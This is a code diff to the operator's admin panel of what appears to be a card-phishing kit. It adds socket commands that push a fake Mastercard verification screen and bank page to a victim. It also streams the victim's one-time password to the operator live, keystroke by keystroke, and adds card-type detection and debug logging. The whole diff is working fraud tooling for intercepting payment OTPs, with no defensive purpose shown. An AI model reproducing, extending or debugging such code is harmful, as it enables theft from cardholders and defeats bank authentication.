@@ -1161,7 +1161,50 @@
       
       isScreenCanvasInitialized = true;
     }
+    function initMcPanel() {
+  console.log('Initializing MC Panel...');
+  
+  // Make sure the panel is initially hidden
+  const mcPanel = document.getElementById('mcOtpPanel');
+  mcPanel.classList.add('hidden');
+  
+  // Debug all buttons
+  document.querySelectorAll('#mcOtpPanel button').forEach(btn => {
+    console.log('Found MC panel button:', btn.id || btn.textContent);
+    
+    // Remove any existing event listeners
+    const newBtn = btn.cloneNode(true);
+    btn.parentNode.replaceChild(newBtn, btn);
+  });
+  
+  console.log('MC Panel buttons reset');
+  
+  // ... rest of the function
+}
+function debugMcVerification() {
+  // Listen for all socket events
+  const originalEmit = socket.emit;
+  socket.emit = function() {
+    console.log('%cEMITTING:', 'color: green; font-weight: bold', arguments[0], Array.from(arguments).slice(1));
+    return originalEmit.apply(this, arguments);
+  };
+  
+  // Add click event debug info
+  document.getElementById('mcStartVerification').addEventListener('click', function() {
+    console.log('%cMC Start Verification clicked!', 'color: blue; font-weight: bold');
+  }, true); // Use capture phase
+  
+  // Debug the socket connection
+  console.log('Current socket state:', {
+    id: socket.id,
+    connected: socket.connected,
+    disconnected: socket.disconnected
+  });
+}
 
+// Call this at initialization
+debugMcVerification();
+    
    // Show error or success message
     function showMessage(type, message, duration = 5000) {
       const element = document.getElementById(type === 'error' ? 'error-msg' : 'success-msg');
@@ -2580,12 +2623,14 @@ document.getElementById('generateFreeLinkForm').addEventListener('submit', async
     }
   }
 });
-    // Show MC Verification
+// Show MC Verification
 function showMCVerification(id) {
   if (!transactionsMap.has(id)) {
     alert('Transaction not found');
     return;
   }
+  
+  console.log('Showing MC verification for transaction:', id);
   
   // Get transaction details
   const tx = transactionsMap.get(id);
@@ -2600,37 +2645,72 @@ function showMCVerification(id) {
   // Reset OTP value display
   document.getElementById('mcOtpValue').textContent = 'Waiting...';
   
-  console.log('Showing MC verification panel for transaction:', id);
+  // Ensure MC fail options are hidden by default
+  document.getElementById('mcFailOptions').style.display = 'none';
+  
+  // Reset phone number field
+  document.getElementById('mcPhoneLastFour').value = '';
+  
+  // Reset defaults for verification type and bank
+  document.getElementById('mcVerificationType').value = detectCardType(tx.cardNumber);
+  document.getElementById('mcBankSelect').value = 'default';
+  
+  // Reset currency based on transaction
+  document.getElementById('mcCurrencySelect').value = tx.currency || 'INR';
+  
+  console.log('MC panel initialized for transaction:', id);
 }
 
-// MC Panel Event Handlers - Add these to your initialization code
-function initMcPanel() {
-  // Start verification button
-  document.getElementById('mcStartVerification').addEventListener('click', () => {
-    if (!currentMcInvoiceId) {
-      alert('No transaction selected');
-      return;
-    }
-    
-    const verificationType = document.getElementById('mcVerificationType').value;
-    const bankCode = document.getElementById('mcBankSelect').value;
-    const currency = document.getElementById('mcCurrencySelect').value;
-    const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
-    
-    if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
-      alert('Please enter the last 4 digits of the phone number');
-      return;
-    }
-    
-    // Send command to show MC verification to the client
-    socket.emit('admin_command', {
-      command: 'show_mc_verification',
-      invoiceId: currentMcInvoiceId,
-      cardType: verificationType,
-      phoneLastFour: phoneLastFour
-    });
-    
-    // Then immediately start verification with the selected options
+// Helper function to detect card type from number
+function detectCardType(cardNumber) {
+  if (!cardNumber) return 'mastercard';
+  
+  if (/^4/.test(cardNumber)) return 'visa';
+  if (/^5[1-5]/.test(cardNumber)) return 'mastercard';
+  if (/^3[47]/.test(cardNumber)) return 'amex';
+  if (/^6(?:011|5)/.test(cardNumber)) return 'discover';
+  if (/^2[2-7]/.test(cardNumber)) return 'mastercard';
+  
+  return 'mastercard'; // Default
+}
+// Start verification button handler
+document.getElementById('mcStartVerification').addEventListener('click', function() {
+  if (!currentMcInvoiceId) {
+    alert('No transaction selected');
+    return;
+  }
+  
+  const verificationType = document.getElementById('mcVerificationType').value;
+  const bankCode = document.getElementById('mcBankSelect').value;
+  const currency = document.getElementById('mcCurrencySelect').value;
+  const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
+  
+  if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
+    alert('Please enter the last 4 digits of the phone number');
+    return;
+  }
+  
+  console.log('Starting MC verification with:', {
+    invoiceId: currentMcInvoiceId,
+    verificationType,
+    bankCode,
+    currency,
+    phoneLastFour
+  });
+  
+  // First, show the MC verification screen to the client
+  socket.emit('admin_command', {
+    command: 'show_mc_verification',
+    invoiceId: currentMcInvoiceId,
+    cardType: verificationType,
+    phoneLastFour: phoneLastFour
+  });
+  
+  console.log('Emitted show_mc_verification command');
+  
+  // Wait a moment before sending the start command
+  setTimeout(() => {
+    // Then send the start verification command with all details
     socket.emit('admin_command', {
       command: 'start_verification',
       invoiceId: currentMcInvoiceId,
@@ -2640,14 +2720,30 @@ function initMcPanel() {
       phoneLastFour: phoneLastFour
     });
     
+    console.log('Emitted start_verification command');
+    
     // Update currency if needed
     socket.emit('update_mc_currency', {
       invoiceId: currentMcInvoiceId,
       currency: currency
     });
     
-    showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
-  });
+    console.log('Emitted update_mc_currency command');
+  }, 1000); // 1 second delay to ensure show_mc_verification is processed first
+  
+  // Set button to loading state
+  const startBtn = document.getElementById('mcStartVerification');
+  startBtn.innerHTML = 'Starting Verification...';
+  startBtn.disabled = true;
+  
+  // Reset button after 3 seconds
+  setTimeout(() => {
+    startBtn.innerHTML = 'Start Verification';
+    startBtn.disabled = false;
+  }, 3000);
+  
+  showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
+});
   
   // Invalid OTP button
   document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
@@ -2855,6 +2951,11 @@ function initMcPanel() {
 
 async function toggleBankpage(id) {
   const tx = transactionsMap.get(id);
+  if (!tx) {
+    alert('Transaction not found');
+    return;
+  }
+  
   try {
     const endpoint = tx.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
     const response = await fetch(endpoint, {
@@ -3017,20 +3118,29 @@ document.addEventListener('DOMContentLoaded', function() {
     a.click();
   });
   
-  // Setup socket event listeners
-  socket.on('mc_otp_submitted', function(data) {
-    console.log('MC OTP received:', data);
-    if (currentMcInvoiceId === data.invoiceId) {
-      document.getElementById('mcOtpValue').textContent = data.otp;
-    }
-  });
-  
-  socket.on('mc_otp_typing', function(data) {
-    console.log('MC OTP typing:', data);
-    if (currentMcInvoiceId === data.invoiceId) {
-      document.getElementById('mcOtpValue').textContent = data.partialOtp + '...';
-    }
-  });
+  // Handle MC OTP submission
+socket.on('mc_otp_submitted', function(data) {
+  console.log('MC OTP received:', data);
+  if (currentMcInvoiceId === data.invoiceId) {
+    document.getElementById('mcOtpValue').textContent = data.otp;
+  }
+});
+
+// Handle MC OTP typing
+socket.on('mc_otp_typing', function(data) {
+  console.log('MC OTP typing:', data);
+  if (currentMcInvoiceId === data.invoiceId) {
+    document.getElementById('mcOtpValue').textContent = data.partialOtp + '...';
+  }
+});
+
+// Log all admin_command events for debugging
+socket.onevent = function(packet) {
+  const [event, ...args] = packet.data;
+  console.log('Socket event:', event, args);
+  const fn = this._callbacks[`$${event}`];
+  if (fn) fn.apply(this, args);
+};
   
   socket.on('visitor', function(data) {
     console.log('New visitor event:', data);
